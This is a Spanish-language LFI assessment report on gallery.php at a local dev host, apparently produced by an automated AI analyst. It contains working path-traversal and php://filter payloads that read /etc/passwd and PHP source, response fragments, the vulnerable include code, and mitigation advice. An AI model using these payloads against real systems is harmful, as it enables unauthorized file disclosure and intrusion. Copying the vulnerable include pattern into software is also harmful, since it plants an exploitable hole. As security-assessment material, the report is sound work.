# Informe de análisis LFI — web.dev.local:8081

- Objetivo: http://web.dev.local:8081
- Fecha (UTC): 2026-04-18T20:29:52
- Analista: GPT-5 mini (automatizado)

Resumen
-------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de gallery.php. Fue posible leer archivos del sistema (/etc/passwd, /etc/hosts) y obtener el código fuente de la página (gallery.php) usando php://filter.

Evidencia y payloads
---------------------
1) Lectura directa de /etc/passwd
- Request: GET /gallery.php?page=../../../../etc/passwd
- Respuesta (fragmento):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

2) Lectura de /etc/hosts
- Request: GET /gallery.php?page=../../../../etc/hosts
- Respuesta (fragmento):
  127.0.0.1 localhost ::1 localhost ... 172.19.0.2 d5054e367753

3) Obtención del código fuente (php://filter)
- Request: GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
- Respuesta: el servidor devolvió el contenido codificado en base64. Al decodificar se obtuvo el código PHP de gallery.php (incluye la lógica vulnerable):

  <?php
  $page = $_GET['page'] ?? 'modern';
  ?>
  ...
  <?php
  // Check if the page parameter contains file extension
  if (strrpos($page, '.') !== false) {
      // If it has an extension, use it as-is
      $file = $page;
  } else {
      // Otherwise, assume it's a page in the pages directory
      $file = "pages/" . $page . ".php";
  }

  if (file_exists($file)) {
      include($file);
  } else {
      echo "<div class='error'>";
      echo "<h3>Página no encontrada</h3>";
      echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
      echo "</div>";
      @include($file); // vulnerable fallback include
  }
  ?>

Nota: la presencia de include($file) y posteriormente @include($file) sin filtros adecuados permite LFI y disclosure.

Impacto
-------
- Divulgación de archivos sensibles (ej.: /etc/passwd, /etc/hosts).
- Divulgación de código fuente PHP (posible descubrimiento de credenciales, rutas, lógica de autenticación).
- En entornos con capacidad de escritura o con carga de extensiones/wrappers habilitados, posible RCE (por ejemplo, mediante inclusion de archivos con código PHP subido o wrappers como php://input en combinación con deserialización).

Reproducción (resumen)
----------------------
1. Visitar: /gallery.php?page=../../../../etc/passwd -> ver /etc/passwd
2. Visitar: /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php -> obtener base64 del código y decodificar

Recomendaciones de mitigación
-----------------------------
1. Usar una lista blanca de vistas válidas (p. ej. ['modern','classic','abstract','about']) y rechazar cualquier valor no listado.
2. Nunca incluir rutas controladas directamente por el usuario. Mapear nombres simbólicos a rutas absolutas internas.
3. Usar realpath() y verificar que la ruta resultante esté dentro del directorio esperado antes de incluir.
4. Evitar wrappers como php://* si no son necesarios. Desactivar allow_url_include si aplica.
5. Registrar y monitorizar intentos de inclusión inválidos.

Conclusión
----------
Vulnerabilidad LFI confirmada y explotada con éxito para leer archivos sensibles y obtener código fuente. Se recomienda aplicar las mitigaciones indicadas con prioridad alta.


